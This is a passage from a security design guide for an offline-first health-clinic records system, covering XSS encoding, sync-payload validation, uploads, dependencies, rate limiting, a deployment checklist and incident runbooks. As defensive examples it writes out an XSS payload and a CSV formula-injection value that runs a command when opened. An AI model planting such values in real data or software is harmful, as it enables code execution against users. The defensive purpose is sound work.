- **Least-privilege DB roles (§6.5).** The API role does not own tables, so a successful injection cannot `DROP`, `ALTER`, or widen its own grants. It also cannot modify `audit_logs`.
- **A CI grep as a tripwire.** `grep -rnE '(Query|Exec)\(.*\+' internal/repo/` should never match. It is crude and it catches the careless case, which is the case that happens.

### 8.2 Output encoding

React escapes interpolated text by default. That default is the primary XSS control, and the way you lose it is by opting out.

**Correct:**

```tsx
// React escapes this. A patient named `<img src=x onerror=…>` renders as literal text.
<h1 className="text-lg font-semibold">{patient.firstName} {patient.lastName}</h1>
<td>{diagnosis.description}</td>
```

**Incorrect — every one of these is a finding:**

```tsx
// ❌ Opting out of escaping for data the user controls.
<div dangerouslySetInnerHTML={{ __html: patient.notes }} />

// ❌ Same, in a toast or a chart tooltip (easy to forget these render HTML).
toast.success(`Saved ${patient.firstName}`);   // safe in sonner (text), but check your libs
chart.setTooltip({ html: `<b>${patient.firstName}</b>` });   // unsafe if it's an HTML tooltip

// ❌ Building a URL from unvalidated data.
window.location.href = patient.website;

// ❌ A markdown renderer on free-text notes without sanitisation.
<ReactMarkdown>{encounter.notes}</ReactMarkdown>   // needs rehype-sanitize with an allow-list
```

Rules:

1. **`dangerouslySetInnerHTML` is banned** in this codebase. If a genuine need appears (a print template, say), it requires a code review, an explicit `// SECURITY:` comment, and sanitisation with `DOMPurify` against an allow-list.
2. **If you add a markdown or rich-text renderer** for clinical notes, it must sanitise with an allow-list. Untrusted markdown → HTML is XSS with extra steps.
3. **Strict CSP** (§6.4) as the second layer: even if an injection lands, `script-src 'self'` blocks the exfiltration payload.
4. **Server-side validation is still required** (§8.3). XSS prevention at the render layer does not excuse storing `<script>` in the database — that payload will find a rendering path you did not consider, in a PDF export, a CSV opened in Excel, or a print stylesheet.
5. **CSV export needs formula-injection handling.** A patient name of `=cmd|'/c calc'!A1` is executed by Excel on open. Prefix exported cells starting with `=`, `+`, `-`, `@`, tab, or CR with a single quote. Accountants export CSVs; this is a real path in this system.
6. **Print stylesheets render patient text too.** The POS slip and the referral print view are rendering paths; a name with newlines or control characters can corrupt the slip layout. Strip control characters on input.

### 8.3 Validation on every sync payload

Architecture §4.4 validates with Zod on the client. **That is a UX feature.** The server must validate everything again, because the client is compromised by assumption (T18, T9). One shared shape, two independent enforcements.

**The server-side list — what must be validated on every `POST /sync/push`:**

| # | What | Rules | Why the server must not trust it |
|---|---|---|---|
| 1 | **Envelope shape** | Zod/Go schema: `client_version`, `device_id`, `operations[]`, `batch_id`. Unknown top-level keys → reject. | A modified client can send anything; strict schemas fail closed |
| 2 | **Batch size** | `1 ≤ len(operations) ≤ 200` | An unbounded batch is a memory and timeout DoS |
| 3 | **Operation count vs payload size** | Reject bodies over ~2 MB before parsing | Same; also protects the 30 s client timeout (architecture §3.3) |
| 4 | **`client_version`** | Must be a known version, or within one minor of current | Architecture §3.4: an old shell may be running offline. Reject *unknown* versions, tolerate *one behind*. |
| 5 | **`device_id`** | Must equal the JWT's `device_id` claim; device must be `active` | Stops a valid session pushing as a different device (T4) |
| 6 | **`op` type** | Must be in the known operation enumeration | An unknown op is either a version mismatch or an attack; both are rejects |
| 7 | **Operation ID** | Valid UUIDv7, **unique within the batch** | Duplicates in one batch indicate a malformed or malicious client; idempotency keys must be genuinely unique |
| 8 | **Entity ID** | Valid UUIDv7 | Reject anything that is not a UUID — never let an arbitrary string become a key |
| 9 | **`created_by` / `updated_by`** | Must equal the JWT `sub`, or be a user the actor is permitted to act for (admin correction, with an audit entry) | Otherwise an attacker attributes their writes to a colleague (T16) |
| 11 | **Timestamps** | `created_at` / `updated_at` parse as RFC 3339 UTC; within a sane window (e.g. not more than `LOCAL_RETENTION_MAX_DAYS` in the past, not more than 5 minutes in the future); store alongside `received_at` and flag large skew | Device clocks are manipulable (T7); the values are clinical facts but the skew must be recorded, not hidden |
| 12 | **`revision`** | Monotonically increasing per entity; must equal the server's current revision + 1, or be a legitimate no-op | Conflict detection depends on this being honest; a client that skips revisions is either stale or forging |
| 13 | **Enum fields** | `status`, `workflow_stage`, `payment_method`, `sex`, `urgency`, `role` — must be in the allowed set | A rogue client setting `status = 'paid'` on an invoice must fail |
| 14 | **Workflow transitions** | Validated against the state machine in the service layer (architecture §7.5) | Transitions are business rules; the client cannot be allowed to skip `awaiting_payment → awaiting_pharmacy` |
| 15 | **Foreign keys** | Referenced rows exist and are not soft-deleted | Prevents dangling references reported as `stale_reference` |
| 16 | **Money** | Integer (reject floats and numeric strings with decimals), within a sane range (>0, < 10⁹ minor units), correct sign for the operation | Money is BIGINT minor units; a float here is a rounding bug and possibly a theft vector (T8) |
| 17 | **Numeric clinical ranges** | Vitals within physiological plausibility (`temperature`, `pulse`, `bp_systolic/diastolic`, `spo2`, `weight`, `height`); reject out-of-range with a clear error | A value of `spO2 = 9999` is either a broken client or a poisoning attempt |
| 18 | **String lengths and charset** | Bounded lengths on every text field; reject control characters; normalise Unicode (NFC) | Truncation bugs become data corruption; control characters break the POS slip and the print layout |
| 19 | **Free-text fields** | Length caps on notes; strip nothing silently — reject | Silent truncation of a clinical note is a data-integrity bug |
| 20 | **File/attachment references** | Only server-issued upload IDs; no inline base64 blobs in the sync payload | Prevents payload inflation and keeps uploads going through §8.4 |
| 21 | **Duplicate natural keys** | `patients.patient_number`, `invoices.invoice_number`, `payments.receipt_number` — globally unique | Two devices offline will generate colliding numbers; the server must resolve, not crash, and must not silently merge two patients |
| 22 | **Referral tokens/PINs in a sync payload** | **Reject outright.** Referrals are created server-side; a client never pushes a token or a PIN. | A client-minted token would be a client-chosen credential. This is a hard rule. |
| 23 | **`audit_logs` in a sync payload** | **Reject outright.** The audit log is server-side and never client-supplied. | A client-writable audit log is not an audit log (architecture §5) |
| 24 | **Per-operation authorisation** | Every operation maps to a capability, checked via `Authz.Authorize` (§5.5) with the actor from the JWT | The batch is not a privileged context; each operation stands alone. One denied op rejects that op and the rest of the batch still applies (or the whole batch is atomic — pick one deliberately and document it). |

**Batch atomicity is a decision you must make and state.** Recommendation: **per-operation atomicity, whole-batch reporting**. Each operation commits in its own transaction; the response reports per-operation outcomes (`applied`, `duplicate`, `rejected` with a reason). Why: a batch of 200 covering a shift should not be entirely lost because one operation has a stale foreign key. The client marks applied ops done and surfaces rejected ones for human attention. Document it, because "partial application" sounds alarming until you explain why the alternative is worse.

```go
// Per-operation result, returned for every operation in the batch.
type OpResult struct {
    OperationID string `json:"operation_id"`
    Status      string `json:"status"`   // applied | duplicate | rejected
    EntityID    string `json:"entity_id,omitempty"`
    Reason      string `json:"reason,omitempty"`   // safe, non-PII, machine-readable
}
```

One more: **the error `Reason` must not echo patient data back.** "Validation failed: dob must be in the past" is fine. "Validation failed for patient Grace Adeyemi, 14 Oak Street" puts PII into a client log and possibly a third-party crash reporter.

### 8.4 File uploads

The system has a narrow legitimate need for uploads: scanned referral documents, lab report attachments, and possibly a patient photograph. **Not** general-purpose file storage.

| Rule | Requirement |
|---|---|
| **Authentication** | Uploads are authenticated and authorised (`Cap.UploadAttachment`); never on the public referral route |
| **Size** | Hard cap (e.g. 5 MB per file, enforced by the server, not just the client) |
| **Type** | Allow-list of MIME types (`application/pdf`, `image/jpeg`, `image/png`) **and** magic-byte sniffing of the actual content. A `.pdf` filename proves nothing. |
| **Extension** | Normalise or ignore the client-supplied filename entirely. Store under a server-generated UUID name. |
| **Storage** | **Object storage, not the request path and not the local replica.** Serve via short-lived signed URLs. Never serve an upload from the API origin — that puts attacker-controlled content on your origin (XSS, and it is the origin that holds the replica). |
| **Serving headers** | `Content-Disposition: attachment`, `X-Content-Type-Options: nosniff`, and a restrictive CSP. Serve from a **separate origin or subdomain** with no access to the app's IndexedDB. |
| **Scanning** | Out of scope for the project. Note as a production requirement: antivirus scanning before the file is made available. |
| **Metadata** | Never trust client-supplied EXIF; strip it on ingest (GPS coordinates in a phone photo of a patient is a PII leak you did not intend to collect) |
| **Offline** | Attachments do **not** go into IndexedDB. Store a reference and the byte length. The offline client shows "attachment available when online". This keeps the replica bounded and keeps large binaries out of the sync payload. |

### 8.5 Dependency hygiene

The SPA ships code from hundreds of packages into an origin that holds every patient record. A compromised dependency is a full breach (§6.4), so dependency management is a security control here, not housekeeping.

| Control | Practice |
|---|---|
| **Pin exactly** | No `^`, no `~` in `package.json` for the app itself. Architecture §2.1–2.3 already pins versions; keep it that way. A silent minor bump in a transitive dependency is how a supply-chain compromise arrives. |
| **Lockfiles committed** | `package-lock.json` / `pnpm-lock.yaml` and `go.sum` in the repository, reviewed in PRs. A lockfile diff is a security review artefact. |
| **`npm ci`, never `npm install` in CI** | `npm ci` respects the lockfile exactly; `npm install` may resolve differently |
| **Automated audit** | `npm audit --production --audit-level=high` and `govulncheck ./...` in CI, failing the build on high/critical |
| **Dependabot / Renovate** | Enabled, but **grouped and reviewed**, not auto-merged. Auto-merging is how you accept a malicious patch release at 3 a.m. |
| **Minimise the tree** | Every dependency is attack surface on the origin that holds the replica. Before adding one, ask whether 30 lines of your own code would do. A date-formatting library for one format string is not worth the risk. |
| **No third-party runtime scripts** | No CDN `<script>` tags, no analytics snippet, no chat widget, no hosted font. Self-host everything. This is the §6.4 origin-isolation rule restated as a dependency rule. |
| **Postinstall scripts** | Audit them. `npm ci --ignore-scripts` where feasible. Postinstall is the standard malware execution hook. |
| **Provenance and review** | Prefer packages with a real maintainer history, signed releases, and recent activity. A typosquatted package name is the oldest trick there is. |
| **Go modules** | `GOFLAGS=-mod=readonly`, `go.sum` verified, `GONOSUMDB`/`GOPRIVATE` unset unless you genuinely vendor. `govulncheck` catches stdlib advisories too. |
| **Container base image** | Pin by digest, use a distroless or scratch base, run as a non-root user, and rebuild on base-image advisories |
| **Secrets in dependencies** | A malicious package's first move is to read `process.env`. The API's secrets are not in the frontend at all — verify that no server secret is ever exposed to the build (`VITE_`-prefixed variables are **public**, by design). This is the mistake that ends projects. |

---

## 9. Rate limiting, abuse, and availability

### 9.1 Limits by endpoint class

| Endpoint class | Limit | Keyed by | Rationale |
|---|---|---|---|
| `POST /auth/login` | **5 / 15 min** | **account** (username) | Stops password guessing against a known user |
| `POST /auth/login` | **20 / 15 min** | **IP** | Stops spraying many accounts from one source |
| `POST /auth/login` | **30 / 15 min** | IP + account | Belt and braces for the shared-NAT case |
| `POST /auth/refresh` | 60 / hour | user + device | Legitimate clients refresh ~4×/hour at a 15-min TTL; 60 is generous |
| `POST /auth/logout` | 20 / hour | user | Cheap, but not free |
| `POST /sync/push` | **12 / min** | device | Sync drains the outbox and backs off; a client pushing 12×/min is already aggressive |
| `POST /sync/push` | **200 operations** per request | — | Payload bound; also keeps the request under the 30 s client timeout |
| `GET /sync/pull` | 30 / min | device | Polling more often than every 2 s is a bug, not a feature |
| `GET /r/:token` (page) | 60 / hour | IP | Public endpoint |
| `GET /r/:token` (page) | 300 / hour | token hash | A single referral being hammered is a leak signal |
| `POST /r/:token/verify` (PIN) | **5 total per referral** | referral ID | **Hard lockout.** This is the control that makes a 6-digit PIN meaningful. |
| `POST /r/:token/verify` (PIN) | 10 / hour | IP | Stops a distributed guess across many tokens |
| `POST /r/:token/verify` (PIN) | 30 / hour | token hash | Stops a focused guess on one token from many IPs |
| Global (per IP) | 600 / min | IP | Blanket abuse ceiling |
| Global (per instance) | Argon2id concurrency semaphore | — | The CPU is the resource being protected (T17) |
| Admin mutations | 60 / hour | user | Admin actions are rare; a burst is worth investigating |
| Export endpoints | **5 / hour** | user | Exports are the highest-value data-egress path; slow them down and log every one |

Return `429` with `Retry-After`. Do not return `403` — a rate limit is not an authorisation decision, and conflating them confuses your logs.

### 9.2 Why login limiting must be by account AND by IP

Either one alone is trivially bypassable, in opposite directions:

| Limiter | Alone it fails because… | Concrete attack |
|---|---|---|
| **By IP only** | An attacker with a botnet, a mobile carrier NAT pool, or a cloud VM fleet has effectively unlimited IPs. | **Distributed password spraying:** 10 000 IPs, one guess each against `admin`. No IP limit ever triggers. |
| **By account only** | A single attacker hits *many* accounts from one IP. | **Credential stuffing:** 5 attempts each against 500 staff accounts. No account limit ever triggers, and with password reuse even a 0.5% hit rate is a breach. |
| **Both** | Neither attack works: the distributed spray trips the account limit, and the stuffing trips the IP limit. | — |

Implementation specifics that matter:

- **Key the limit on the normalised username** (lowercased, trimmed) — otherwise `Grace`, `grace `, and `GRACE` are three separate counters, and the limit is three times what you think.
- **Count failures, and reset on success.** A successful login clears the counter. Otherwise a legitimate user who mistypes twice a day accumulates a lockout over a week.
- **Prefer escalating delay over hard lockout for accounts.** Hard account lockout is a **denial-of-service gift**: an attacker who knows a nurse's username can lock her out of the system on a clinic day by failing five logins. Use exponential backoff (1 s, 2 s, 4 s, … capped at 30 s) and alert on the pattern, rather than locking the account. This is a real, well-known trade-off and worth a sentence in your report.
- **The referral PIN is the exception: there, hard lockout is correct.** A locked referral is an inconvenience; a brute-forced referral is a confidentiality breach. And the doctor can always issue a new one.
- **Do not reveal which limiter tripped.** A generic "too many attempts" message, with the specifics in the log.
- **Log the counter state on failure** (`attempts_remaining`) — in the log, not in the response. It is a useful signal for the admin dashboard.
- **Cloudflare rate limiting is layer one, not the solution.** Put rules on `/auth/login` and `/r/*`, but keep the application limits, because direct `*.run.app` access bypasses Cloudflare.

### 9.3 The DoS cost of an unauthenticated referral endpoint

This deserves its own subsection because it is a specific, non-obvious consequence of the design, and it is exactly the kind of thing that separates a considered answer from a template one.

**The problem:** `/r/:token` is public by requirement. Every request that presents a *valid* token triggers Argon2id verification of the PIN — and Argon2id is **deliberately** expensive (64 MiB, 3 passes). That is roughly 100–250 ms of CPU and 64 MiB of RAM per attempt. A few hundred concurrent requests will exhaust a Cloud Run instance's memory and CPU and take the whole API down with it — including `/sync/push`, which is the clinical write path.

The attacker does not even need a valid token. If the code path hashes the PIN *before* validating the token, then **any** request is an Argon2id oracle.

**Mitigations, in order of importance:**

1. **Validate the token and expiry before any KDF work.** A cheap indexed `SELECT` returns nothing for a bogus token, and the request is rejected in microseconds. This ordering is the single most important line of defence.
2. **Bound Argon2id concurrency with a semaphore** sized to roughly 2 × vCPU. Excess requests wait briefly, then shed with `503` and `Retry-After`. Better to fail 20 referral views than to fail every clinic in the region.
3. **Isolate the referral route's resource budget.** If you can, put the public referral endpoints on a separate Cloud Run service with its own `--max-instances`, so a referral flood cannot starve `/sync/push`. Failing that, at least cap `--max-instances` on the API so a flood cannot scale you into a bill you cannot pay.
4. **Cloudflare in front**, with rate limiting and a WAF rule on `/r/*`. This absorbs volumetric attacks before they reach Cloud Run and before they cost you a cold start.
5. **Cloudflare caching where safe.** The referral *page shell* is static and cacheable. The *content* is not (it is per-token and confidential), so no caching of the note itself. Cache-busting the static shell is fine.
6. **Do not make it worse.** Do not add Argon2id verification to `/r/:token` page views (only to PIN submissions). Do not add a second KDF. Do not "improve security" by increasing the Argon2id cost on this path — you would be building a better DoS weapon.
7. **Alert on the shape of the attack.** A spike in `referral_access_log` rows with `outcome = 'denied'` and no `pin_success` is the signature. Page the admin (§11.3).

**The honest trade-off:** you are exposing an expensive operation to unauthenticated callers because the requirement demands an unauthenticated read path. The mitigation is to make the cheap checks cheap and to bound the expensive ones, and to accept that a determined attacker can still degrade the referral feature. Availability of the *clinical* path (`/sync/push`) matters more than availability of the referral path, so architect for that priority explicitly.

### 9.4 Availability as a security property

Briefly, because it belongs in the threat model (T12, T20) and architecture §3.3 already covers the mechanics:

- **Availability of the clinical record is a safety requirement.** A nurse who cannot read a patient's allergies will make a worse decision.
- **The offline design is itself the main availability control** — the system keeps working when the network does not, which is more than most of the controls in this document can claim.
- **But it moves the availability risk to the devices:** a device that dies takes un-synced data with it (T12). Mitigations: aggressive outbox draining whenever *any* connectivity appears, a visible un-synced counter with the age of the oldest operation, a documented rule that a device is not retired until its outbox is empty, and an encrypted manual outbox export as a last resort.
- **Cloud Run cold starts are an availability trap, not a security hole** (T20): 30 s client timeout, exponential backoff with jitter, a circuit breaker, and `--min-instances=1` for the demo.

---

## 10. Secure deployment checklist

Print this. Tick it. Keep the ticked copy — it is evidence, and it is also the answer to "how do you know FDE was enabled on that laptop?"

### 10.1 Secrets management

- [ ] **No secret in the repository.** Not in code, not in `.env` committed by accident, not in a comment, not in a migration, not in the README, not in a test fixture. Enable secret scanning (GitHub secret scanning + push protection).
- [ ] **No secret in the container image.** `docker history` must not reveal a build arg containing a secret. Pass secrets at runtime, never at build time.
- [ ] **No secret in the frontend bundle.** Anything with a `VITE_` prefix is **public**. Verify by grepping the built `dist/` for your secret strings. The SPA holds no server secret, ever.
- [ ] **`JWT_SECRET`, DB password, Neon API key, and any pepper live in Google Secret Manager**, mounted into Cloud Run as env vars or files at deploy time.
- [ ] **`JWT_SECRET` is ≥32 random bytes** from a CSPRNG, not a passphrase, not `changeme`, and different per environment.
- [ ] **`MIGRATION_DATABASE_URL` is never available to the running API.** Migrations run in a separate step with a separate, more privileged role (§6.5).
- [ ] **Rotation procedure documented and tested** for `JWT_SECRET` (requires accepting both keys during a rollover window) and for DB credentials.
- [ ] **Access to Secret Manager is least-privilege** — the Cloud Run service account can read only the secrets it needs.
- [ ] `.gitignore` covers `.env*`, `*.pem`, `*.key`, `service-account*.json`, and `.dev.vars`.
- [ ] **Git history is clean.** If a secret ever landed in a commit, rotate it. Deleting the commit is not enough.

### 10.2 Database and least privilege

- [ ] **Two roles: `phc_migrator` (owns tables, used only by goose) and `phc_api` (runtime, owns nothing).** The API role must not own tables — an owner can re-grant itself anything, which quietly defeats every other grant.
- [ ] **`audit_logs` grants for `phc_api`: `SELECT, INSERT` only.** Verified after every migration by querying `information_schema.role_table_grants`.
- [ ] **`referral_access_log` has the same treatment.**
- [ ] **No `UPDATE`/`DELETE` against `audit_logs` anywhere in `internal/repo/`**, verified by a CI grep.
- [ ] **A read-only `phc_auditor` role exists** for audit review and exports.
- [ ] **API connects to the Neon *pooled* endpoint; migrations use the *direct* endpoint** (architecture §3.2). Mixing them produces intermittent prepared-statement errors — a bug that looks like a security problem during your demo.
- [ ] **`QueryExecMode: pgx.QueryExecModeExec`** on the API pool (architecture §3.2).
- [ ] **`MaxConns` × Cloud Run `--max-instances` stays under the Neon plan's ceiling.**
- [ ] **No production data in development or staging branches.** Use Neon's schema-only branching.
- [ ] **PITR configured and a restore actually rehearsed** — an untested backup is a belief, not a control. Record the restore time; you will be asked.
- [ ] **Neon project access limited to the minimum number of humans**, with MFA on those accounts.
- [ ] **A documented policy for `pg_dump` and manual exports**: who may run one, where the output may be stored (encrypted, never a laptop's Downloads folder), and that it must be deleted after use.

### 10.3 Cloud Run

- [ ] Binds to `$PORT` (architecture §3.1) — the classic "builds fine, never serves" trap.
- [ ] **Runs as a non-root user**; container filesystem is read-only where possible.
- [ ] **`--max-instances` capped** — this is both a cost control and a DoS blast-radius control. Uncapped autoscaling under a flood is an unbounded bill.
- [ ] **`--min-instances=1` for the defence demo only** (architecture §3.3).
- [ ] **`--ingress` restricted to Cloudflare** if you can (via a load balancer or by validating a shared header). Note the limitation: `*.run.app` URLs are public by default, so **the API must be secure on its own**, not because Cloudflare is in front.
- [ ] **`TRUST_PROXY=true` and `router.SetTrustedProxies(...)` set explicitly**, so `CF-Connecting-IP` is read correctly and audit IPs are real (architecture §3.6). Never blindly trust `X-Forwarded-For` — anyone can forge it, and a forgeable audit IP is worse than no audit IP.
- [ ] **Request timeout and max request size** configured to match the sync batch bounds (§8.3).
- [ ] **Service account is least-privilege** — read the specific secrets it needs, write logs, nothing else. No `roles/editor`.
- [ ] **Structured JSON logs to Cloud Logging**, with the redaction rules in §10.6 applied before the line is written.
- [ ] **Container base image pinned by digest**, rebuilt on advisories, and scanned (`docker scan` / Artifact Analysis).

### 10.4 Cloudflare

- [ ] **SSL/TLS mode: Full (Strict).** Flexible mode sends plaintext to the origin and defeats TLS.
- [ ] **Always Use HTTPS** on.
- [ ] **HSTS enabled** (`max-age=31536000; includeSubDomains`) — and only add `preload` once you are certain no plaintext subdomain is needed. It is a one-way door.
- [ ] **Minimum TLS version 1.2**, TLS 1.3 preferred.
- [ ] **Rate limiting rules** on `/auth/login`, `/auth/refresh`, `/r/*`, and `/sync/*`, as a layer in front of the application limits (§9.1).
- [ ] **WAF managed rules** on. Turn on the OWASP core ruleset.
- [ ] **Bot Fight Mode** on for the public routes; be careful not to block legitimate referral views from corporate networks. Test before enforcing.
- [ ] **`Referrer-Policy: no-referrer`** on the `/r/*` route specifically, so the token never leaks in a `Referer` header (§7.2).
- [ ] **Security headers** set at the edge and/or by the app: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`), `Permissions-Policy` disabling camera/microphone/geolocation except where the QR scanner genuinely needs the camera.
- [ ] **CSP** as strict as the build allows (§6.4), with the `style-src 'unsafe-inline'` exception for Tailwind v4 documented and justified rather than assumed.
- [ ] **Cloudflare account MFA on**, with the minimum number of users and scoped API tokens.
- [ ] **Note the trust boundary:** Cloudflare terminates TLS. That means Cloudflare can, in principle, see plaintext. Accept it (it is standard practice) or note it as a considered risk in your report.

### 10.5 CORS

- [ ] **Explicit allow-list from `ALLOWED_ORIGINS`** — the CF Pages production domain and the preview domains you actually use. Never `AllowAllOrigins` (architecture §3.5).
- [ ] **`AllowCredentials: false`** — auth is a `Bearer` header, so credentials are not needed. Turning it on with a wildcard is also rejected by browsers, but the point is not to enable what you do not need.
- [ ] **`AllowHeaders: ["Authorization", "Content-Type", "X-Device-Signature", "X-Device-Timestamp", "X-Device-Nonce"]`** — explicit, not `*`.
- [ ] **`AllowMethods`** limited to what the API uses.
- [ ] **`MaxAge`** set (e.g. 600 s) to reduce preflight chatter, which matters for the sync loop.
- [ ] **Do not treat CORS as a security control.** It protects browser users from cross-origin reads. It does nothing against `curl`. Every endpoint must be secure without it.

### 10.6 Logging and redaction

- [ ] **A redaction layer runs before any log line is written** — not as a review convention, as code.
- [ ] **Never logged:** passwords, password hashes, offline verifiers, access tokens, refresh tokens, device private keys, referral tokens, referral PINs, `Authorization` headers, `Cookie` headers, request bodies containing patient data, and full patient names in log messages.
- [ ] **`request_id` on every line**, correlated with the response header, so an incident can be reconstructed.
- [ ] **Patient identifiers are logged as IDs, not names.** `patient_id=0192f3…` is fine and is what you query on. `patient=Grace Adeyemi` is a PII leak into a log aggregator with different access controls and a different retention policy.
- [ ] **Stack traces never reach the client.** Return a generic error with a `request_id`; log the detail. A Go stack trace can leak table names, file paths, and query fragments.
- [ ] **Third-party crash reporting is prohibited on the authenticated origin** (§6.4). If you must use it, it needs a scrubbing step and a data-processing agreement — and it is not worth it for this project.
- [ ] **Log retention defined**, with the audit log retained longer than application logs (the audit log is evidence; application logs are operations).

### 10.7 Device and workstation deployment checklist (at the PHC)

This is the checklist that actually determines whether the headline risk (T1) is mitigated. Complete it **per device**, at enrolment, and record the evidence.

- [ ] **Full-disk encryption enabled and verified** — `manage-bde -status` / `lsblk -f` / `fdesetup status`. Record the output in the device register. **This is the single highest-value control in this document.**
- [ ] **Recovery key escrowed** somewhere the facility can reach if the disk fails, and *not* taped to the laptop.
- [ ] **OS and browser updates enabled and applied.** An unpatched browser is a remote code execution vector into the origin that holds the replica.
- [ ] **Screen lock: ≤5 minutes idle**, requiring a password (not a swipe). Enforced by OS policy, not by instruction.
- [ ] **BIOS/UEFI password and boot order locked** so the machine cannot be booted from removable media to bypass the OS login. (FDE with a TPM makes this much stronger; without a TPM, a pre-boot PIN is required.)
- [ ] **A dedicated OS user account per staff member** where the hardware allows it. Separate OS profiles mean separate browser profiles and separate IndexedDB stores, which is real isolation.
- [ ] **Physical security:** the workstation is not left unattended in an unsecured room; the records room is lockable; laptops are not left in vehicles (the scenario in T1).
- [ ] **The device is registered in the system** (`POST /devices/register`) with a meaningful label — "Triage laptop 2", not "Device 7". The admin device list is only useful if the labels map to physical machines.
- [ ] **The device owner(s) are recorded**, so revocation is a two-second decision rather than an investigation.
- [ ] **Staff briefed on the offline grace period** and what the banner means. A control nobody understands gets worked around.
- [ ] **Staff briefed that a lost device must be reported immediately** — and that reporting it is not a disciplinary event. If people hide losses, revocation is delayed and the control fails for social reasons, not technical ones.
- [ ] **The referral slip handling policy is in place:** shred after use, do not photograph, do not forward (T15).
- [ ] **A spare device exists** and is kept in sync, because the fastest response to a lost device is to hand over another one.
- [ ] **Decommissioning procedure known:** clear the local replica (§3.6), revoke the device (§4.5), confirm the outbox was empty first.

---

## 11. Incident response

Short, concrete, and written **before** you need it. The goal is that the first ten minutes are a checklist, not a debate. Record every action with a timestamp — the record is part of the response.

### 11.1 Lost or stolen device

**Assumption: assume the data on it is compromised.** You cannot prove otherwise, and the device held every patient record.

| # | Action | Owner | Target |
|---|---|---|---|
| 1 | **Revoke the device** — `POST /admin/devices/:id/revoke` with a reason. This kills all refresh-token families and denylists outstanding access tokens (§4.5). | Admin | **< 15 min** |
| 2 | Confirm the device is now rejected: `POST /sync/push` from it must return `403 device_revoked_or_unknown`. | Admin | < 30 min |
| 3 | **Assess un-synced data.** Query the last successful push from that device. Anything created after it exists **only** on the lost device. | Admin + clinical lead | < 2 h |
| 4 | **Quantify the loss and decide the clinical response.** For each affected patient, decide: re-register on the recovered record, contact the patient, or accept the gap. Document the decision per patient. | Clinical lead | < 24 h |
| 5 | **Force re-authentication for the user** if credential compromise is plausible (the device stored a refresh token and an offline verifier). Reset the password; revoke all sessions. | Admin | < 1 h if plausible |
| 6 | **Notify** per policy: the facility manager, the data protection officer, and — if patient data was likely exposed — the regulator within the statutory window (§6.6). **Check the current deadline before you need it.** | Facility manager | Per policy |
| 7 | **Recover or remote-wipe** if the device returns. If it returns, treat it as untrusted: wipe, reinstall, re-enrol, do not reuse the profile. | Admin | — |
| 8 | **Write the incident report** from the audit log: what was on the device, what was lost, what was exposed, actions taken, timestamps. | Admin | < 5 days |

**If the device had FDE and a screen lock, the confidentiality exposure is much lower** — say so in the report, with the evidence from the deployment checklist (§10.7). That is why the checklist records the FDE output rather than just asserting it.

### 11.2 Suspected credential compromise

Triggers: failed-login spikes against one account, the user reports a suspicious prompt, a password appears in a breach corpus, an unusual login pattern (new country, odd hours), or a `refresh_token reuse_detected` audit event.

| # | Action |
|---|---|
| 1 | **Revoke all sessions and all refresh-token families for that user.** Reuse detection already does this automatically — verify it fired. |
| 2 | **Force a password change** at next login. Invalidate the offline verifiers on all devices by bumping a `credential_version` so every device must re-authenticate online. |
| 3 | **Review the audit log** for the account: what did it read, what did it write, from which devices and IPs, over what period. **Look for reads of sensitive-flagged records** (§6.7) — that is where the harm concentrates. |
| 4 | **Check for privilege escalation:** did the role change, did a device get registered, did a tariff or payment get altered? |
| 5 | **If the account had admin rights, assume the whole system is suspect.** Rotate `JWT_SECRET` (accepting both keys through a rollover window), rotate DB credentials, and audit every admin action in the window. |
| 6 | **Assess notification duty** if patient data was accessed (§6.6). |
| 7 | **Tell the user what happened and what to do** — plainly, and without blame. Blame suppresses reporting, and suppressed reporting is the real vulnerability. |

### 11.3 Referral token leak

Triggers: an `referral_access_log` spike for one token; a `referer` pointing at a chat or mail client; a `pin_locked` event; a clinician reports forwarding the link; a slip is found discarded.

| # | Action |
|---|---|
| 1 | **Revoke the referral immediately** — `POST /referrals/:id/revoke`, reason `suspected link leak` (§7.6). Access fails at once; no un-revoke. |
| 2 | **Pull the `referral_access_log` for that referral.** Every `page_view`, `pin_attempt`, and `pin_success` with IP, time, user agent, and `referer`. Determine whether the PIN was ever successfully verified. |
| 3 | **Interpret the log honestly.** Many `page_view` rows with **no** `pin_success` means the PIN held — the leak is contained, the note was not read. **Any** `pin_success` from an unexpected IP means the note was read, and you must notify per policy. |
| 4 | **If the PIN was compromised too** (the slip was photographed, T15), treat it as a read disclosure and notify. The PIN and token on the same slip are one factor, and this is the moment that matters. |
| 5 | **Issue a new referral with a new token and a new PIN** if the patient still needs transferring. Never re-enable the old one. |
| 6 | **Brief the issuing doctor**, and reinforce the handling rule. If the leak was a forwarded screenshot, the fix is a conversation, not a control. |
| 7 | **Consider raising the PIN lockout threshold down** (from 5 to 3) if this becomes a pattern, and reconsider whether the PIN belongs on the slip at all — the honest conclusion of repeated leaks is that it should not be. |

### 11.4 Database breach (or suspicion of one)

Triggers: unexpected Neon access, a leaked credential, an anomalous export, an unexpected branch, a `pg_dump` on an unauthorised machine, an unexplained data volume change.

| # | Action |
|---|---|
| 1 | **Rotate every database credential** and the Neon API keys. Assume the old ones are burned. |
| 2 | **Rotate `JWT_SECRET`**, accepting both keys for one access-token TTL (15 min), then retire the old one. |
| 3 | **Freeze and preserve evidence:** snapshot the Neon branch, capture Cloud Logging and Cloudflare logs for the window, and record who accessed what. Do not clean up before you have captured. |
| 4 | **Scope the exposure** from the audit log and Neon's own access logs: which tables, which rows, which patients. `audit_logs` tells you about reads through the API; Neon's logs tell you about direct access. **A breach via direct DB access is invisible to `audit_logs`** — a key limitation to state honestly. |
| 5 | **Determine what was *not* exposed.** Device private keys never reach the server. Passwords are Argon2id hashes. Referral tokens are stored as SHA-256 hashes, so leaked hashes do not yield live links. This is the payoff of §3.1 and §7.3 — enumerate it. |
| 6 | **Assess notification duty** for affected data subjects and the regulator, within the statutory window (§6.6). Health data raises the stakes; do not under-notify out of embarrassment. |
| 7 | **Post-incident:** why did this happen, what control would have stopped it, and what changes? Update this document. A runbook that never changes is a runbook nobody used. |

### 11.5 Audit-log review procedure

A standing procedure, run **monthly** and after any incident. It is how you find the things that did not generate an alert.

| # | Check | What you are looking for |
|---|---|---|
| 1 | **Every row with `severity >= warning`** in the period | Anything unexpected. Read them all; the volume is low by design. |
| 2 | **`authz.denied` grouped by actor** | Repeated attempts to reach capabilities outside a role. One is a bug; a pattern is a person (T3). |
| 3 | **Sensitive-record views** with their reasons (§6.7) | A cashier or front-desk user should never appear. A clinician viewing records outside their active encounters should be asked why. |
